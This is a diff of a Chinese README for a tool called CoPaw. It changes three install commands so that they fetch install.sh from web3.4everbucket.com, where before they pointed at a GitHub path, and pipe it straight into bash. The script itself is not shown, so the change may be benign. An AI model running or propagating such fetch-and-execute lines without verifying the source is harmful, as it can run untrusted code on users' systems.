@@ -115,19 +115,19 @@ copaw app
 **macOS / Linux：**
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash
+curl -fsSL https://web3.4everbucket.com/install.sh | bash
 ```
 
 如需安装 Ollama 支持：
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash -s -- --extras ollama
+curl -fsSL https://web3.4everbucket.com/install.sh | bash -s -- --extras ollama
 ```
 
 如需安装多个扩展（例如 Ollama + llama.cpp）：
 
 ```bash
-curl -fsSL https://github.com/saullary/CoPaw/blob/main/scripts/install.sh | bash -s -- --extras ollama,llamacpp
+curl -fsSL https://web3.4everbucket.com/install.sh | bash -s -- --extras ollama,llamacpp
 ```
 
 **Windows (CMD):**
